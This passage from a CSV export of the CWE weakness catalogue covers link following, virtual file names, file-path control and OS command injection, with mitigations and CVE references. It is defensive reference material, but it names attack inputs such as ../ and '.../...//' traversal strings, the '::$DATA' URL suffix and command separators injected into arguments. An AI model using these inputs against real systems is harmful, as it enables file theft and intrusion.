partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Follow the principle of least privilege when assigning access rights to entities in a software system. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.::\",\"::REFERENCE:CVE-1999-1386:DESCRIPTION:Some versions of Perl follow symbolic links when running with the -e option, which allows local users to overwrite arbitrary files via a symlink attack.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1386::REFERENCE:CVE-2000-1178:DESCRIPTION:Text editor follows symbolic links when creating a rescue copy during an abnormal exit, which allows local users to overwrite the files of other users.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1178::REFERENCE:CVE-2004-0217:DESCRIPTION:Antivirus update allows local users to create or append to arbitrary files via a symlink attack on a logfile.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0217::REFERENCE:CVE-2003-0517:DESCRIPTION:Symlink attack allows local users to overwrite files.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0517::REFERENCE:CVE-2004-0689:DESCRIPTION:Window manager does not properly handle when certain symbolic links point to stale locations, which could allow local users to create or truncate arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0689::REFERENCE:CVE-2005-1879:DESCRIPTION:Second-order symlink vulnerabilities:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1879::REFERENCE:CVE-2005-1880:DESCRIPTION:Second-order symlink vulnerabilities:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1880::REFERENCE:CVE-2005-1916:DESCRIPTION:Symlink in Python program:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1916::REFERENCE:CVE-2000-0972:DESCRIPTION:Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0972::REFERENCE:CVE-2005-0824:DESCRIPTION:Signal causes a dump that follows symlinks.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0824::REFERENCE:CVE-2001-1494:DESCRIPTION:Hard link attack, file overwrite; interesting because program checks against soft links:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1494::REFERENCE:CVE-2002-0793:DESCRIPTION:Hard link and possibly symbolic link following vulnerabilities in embedded operating system allow local users to overwrite arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0793::REFERENCE:CVE-2003-0578:DESCRIPTION:Server creates hard links and unlinks files as root, which allows local users to gain privileges by deleting and overwriting arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0578::REFERENCE:CVE-1999-0783:DESCRIPTION:Operating system allows local users to conduct a denial of service by creating a hard link from a device special file to a file on an NFS file system.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0783::REFERENCE:CVE-2004-1603:DESCRIPTION:Web hosting manager follows hard links, which allows local users to read or modify arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1603::REFERENCE:CVE-2004-1901:DESCRIPTION:Package listing system allows local users to overwrite arbitrary files via a hard link attack on the lockfiles.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1901::REFERENCE:CVE-2005-1111:DESCRIPTION:Hard link race condition:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1111::REFERENCE:CVE-2000-0342:DESCRIPTION:Mail client allows remote attackers to bypass the user warning for executable attachments such as .exe, .com, and .bat by using a .lnk file that refers to the attachment, aka Stealth Attachment.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0342::REFERENCE:CVE-2001-1042:DESCRIPTION:FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1042::REFERENCE:CVE-2001-1043:DESCRIPTION:FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1043::REFERENCE:CVE-2005-0587:DESCRIPTION:Browser allows remote malicious web sites to overwrite arbitrary files by tricking the user into downloading a .LNK (link) file twice, which overwrites the file that was referenced in the first .LNK file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0587::REFERENCE:CVE-2001-1386:DESCRIPTION:.LNK. - .LNK with trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1386::REFERENCE:CVE-2003-1233:DESCRIPTION:Rootkits can bypass file access restrictions to Windows kernel directories using NtCreateSymbolicLinkObject function to create symbolic link:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1233::REFERENCE:CVE-2002-0725:DESCRIPTION:File system allows local attackers to hide file usage activities via a hard link to the target file, which causes the link to be recorded in the audit trail instead of the target file.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0725::REFERENCE:CVE-2003-0844:DESCRIPTION:Web server plugin allows local users to overwrite arbitrary files via a symlink attack on predictable temporary filenames.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0844::REFERENCE:CVE-2015-3629:DESCRIPTION:A Libcontainer used in Docker Engine allows local users to escape containerization and write to an arbitrary file on the host system via a symlink attack in an image when respawning a container.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-3629::REFERENCE:CVE-2021-21272:DESCRIPTION:Zip Slip vulnerability in Go-based Open Container Initiative (OCI) registries product allows writing arbitrary files outside intended directory via symbolic links or hard links in a gzipped tarball.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21272::REFERENCE:CVE-2020-27833:DESCRIPTION:Zip Slip vulnerability in container management product allows writing arbitrary files outside intended directory via a container image (.tar format) with filenames that are symbolic links that point to other files within the same tar file; however, the files being pointed to can also be symbolic links to destinations outside the intended directory, bypassing the initial check.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-27833::\",::File Processing::,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Link Following::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO02-C:ENTRY NAME:Canonicalize path names originating from untrusted sources::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:POS01-C:ENTRY NAME:Check for the existence of links when dealing with files::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:FIO01-PL:ENTRY NAME:Do not operate on files that can be modified by untrusted users:MAPPING FIT:CWE More Specific::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP18:ENTRY NAME:Link in resource name resolution::\",::132::17::35::76::,\"::TYPE:Theoretical:NOTE:Link following vulnerabilities are Multi-factor Vulnerabilities (MFV). They are the combination of multiple elements: file or directory permissions, filename predictability, race conditions, and in some cases, a design limitation in which there is no mechanism for performing atomic file creation operations. Some potential factors are race conditions, permissions, and predictability.::\",\n66,\"Improper Handling of File Names that Identify Virtual Resources\",Base,Draft,\"The product does not handle or incorrectly handles a file name that identifies a virtual resource that is not directly specified within the directory that is associated with the file name, causing the product to perform file-based operations on a resource that is not a file.\",\"Virtual file names are represented like normal file names, but they are effectively aliases for other resources that do not behave like normal files. Depending on their functionality, they could be alternate entities. They are not necessarily listed in directories.\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Other:IMPACT:Other::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-1999-0278:DESCRIPTION:In IIS, remote attackers can obtain source code for ASP files by appending ::$DATA to the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0278::REFERENCE:CVE-2004-1084:DESCRIPTION:Server allows remote attackers to read files and resource fork content via HTTP requests to certain special file names related to multiple data streams in HFS+.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1084::REFERENCE:CVE-2002-0106:DESCRIPTION:Server allows remote attackers to cause a denial of service via a series of requests to .JSP files that contain an MS-DOS device name.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0106::\",::File Processing::,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Virtual Files::\",,\"\",\n73,\"External Control of File Name or Path\",Base,Draft,\"The product allows user input to control or influence paths or file names that are used in filesystem operations.\",\"This could allow an attacker to access or modify system files or other files that are critical to the application. Path manipulation errors occur when the following two conditions are met: 1. An attacker can specify a path used in an operation on the filesystem. 2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\",::NATURE:ChildOf:CWE ID:642:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:610:VIEW ID:1000::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:22:VIEW ID:1000::NATURE:CanPrecede:CWE ID:41:VIEW ID:1000::NATURE:CanPrecede:CWE ID:98:VIEW ID:1000::NATURE:CanPrecede:CWE ID:434:VIEW ID:1000::NATURE:CanPrecede:CWE ID:59:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Unix:OPERATING SYSTEM PREVALENCE:Often::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Often::OPERATING SYSTEM CLASS:macOS:OPERATING SYSTEM PREVALENCE:Often::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:NOTE:The application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Modify Files or Directories:IMPACT:Execute Unauthorized Code or Commands:NOTE:The application can operate on unexpected files. This may violate integrity if the filename is written to, or if the filename is for a program or other form of executable code.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (Other):NOTE:The application can operate on unexpected files. Availability can be violated if the attacker specifies an unexpected file that the application modifies. Availability can also be affected if the attacker specifies a filename for a large file, or points to a special device or a file that does not have the format that the application expects.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:The external control or influence of filenames can often be detected using automated static analysis that models data flow within the product. Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.::\",\"::PHASE:Architecture and Design:DESCRIPTION:When the set of filenames is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap provide this capability.::PHASE:Architecture and Design Operation:DESCRIPTION:Run your code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory. Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes .. sequences and symbolic links (CWE-23, CWE-59).::PHASE:Installation Operation:DESCRIPTION:Use OS-level permissions and run as a low-privileged user to limit the scope of any successful attack.::PHASE:Operation Implementation:DESCRIPTION:If you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::PHASE:Testing:DESCRIPTION:Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.::\",\"::REFERENCE:CVE-2022-45918:DESCRIPTION:Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using ../ sequences (CWE-24):LINK:https://www.cve.org/CVERecord?id=CVE-2022-45918::REFERENCE:CVE-2008-5748:DESCRIPTION:Chain: external control of values for user's desired language and theme enables path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5748::REFERENCE:CVE-2008-5764:DESCRIPTION:Chain: external control of user's target language enables remote file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5764::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Path Manipulation::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",::13::267::64::72::76::78::79::80::,\"::TYPE:Maintenance:NOTE:CWE-114 is a Class, but it is listed a child of CWE-73 in view 1000. This suggests some abstraction problems that should be resolved in future versions.::TYPE:Relationship:NOTE:The external control of filenames can be the primary link in chains with other file-related weaknesses, as seen in the CanPrecede relationships. This is because software systems use files for many different purposes: to execute programs, load code libraries, to store application data, to store configuration settings, record temporary data, act as signals or semaphores to other processes, etc. However, those weaknesses do not always require external control. For example, link-following weaknesses (CWE-59) often involve pathnames that are not controllable by the attacker at all. The external control can be resultant from other issues. For example, in PHP applications, the register_globals setting can allow an attacker to modify variables that the programmer thought were immutable, enabling file inclusion (CWE-98) and path traversal (CWE-22). Operating with excessive privileges (CWE-250) might allow an attacker to specify an input filename that is not directly readable by the attacker, but is accessible to the privileged program. A buffer overflow (CWE-119) might give an attacker control over nearby memory locations that are related to pathnames, but were not directly modifiable by the attacker.::\",\n76,\"Improper Neutralization of Equivalent Special Elements\",Base,Draft,\"The product correctly neutralizes certain special elements, but it improperly neutralizes equivalent special elements.\",\"The product may have a fixed list of special characters it believes is complete. However, there may be alternate encodings, or representations that also have the same meaning. For example, the product may filter out a leading slash (/) to prevent absolute path names, but does not account for a tilde (~) followed by a user name, which on some *nix systems could be expanded to an absolute pathname. Alternately, the product might filter a dangerous -e command-line switch when calling an external program, but it might not account for --exec or other switches that have the same semantics.\",::NATURE:ChildOf:CWE ID:75:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Other:IMPACT:Other::\",\"\",\"::PHASE:Requirements:DESCRIPTION:Programming languages and supporting technologies might be chosen which are not subject to these issues.::PHASE:Implementation:DESCRIPTION:Utilize an appropriate mix of allowlist and denylist parsing to filter equivalent special element syntax from all input.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Equivalent Special Element Injection::\",,\"\",\n78,\"Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\",Base,Stable,\"The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.\",\"This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage. There are at least two subtypes of OS command injection: The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system(nslookup [HOSTNAME]) to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing. The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use exec([COMMAND]) to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line. From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.\",::NATURE:ChildOf:CWE ID:77:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1340:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:88:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Shell injection::TERM:Shell metacharacters::TERM:OS Command Injection::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Non-Repudiation:IMPACT:Execute Unauthorized Code or Commands:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:IMPACT:Read Application Data:IMPACT:Modify Application Data:IMPACT:Hide Activities:NOTE:Attackers could execute unauthorized operating system commands, which could then be used to disable the product, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives. Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke OS commands, leading to false negatives - especially if the API/library code is not available for analysis.::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.:EFFECTIVENESS:Moderate::METHOD:Manual Static Analysis:DESCRIPTION:Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:If at all possible, use library calls rather than external processes to recreate the desired functionality.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::PHASE:Architecture and Design:STRATEGY:Attack Surface Reduction:DESCRIPTION:For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).::PHASE:Implementation:DESCRIPTION:If the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line.::PHASE:Architecture and Design:STRATEGY:Parameterization:DESCRIPTION:If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated. Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When constructing OS command strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ; and > characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components. Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.::PHASE:Operation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's -T switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's -T switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not. In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used.::PHASE:Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Use runtime policy enforcement to create an allowlist of allowable commands, then prevent use of any command that does not appear in the allowlist. Technologies such as AppArmor are available to do this.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in 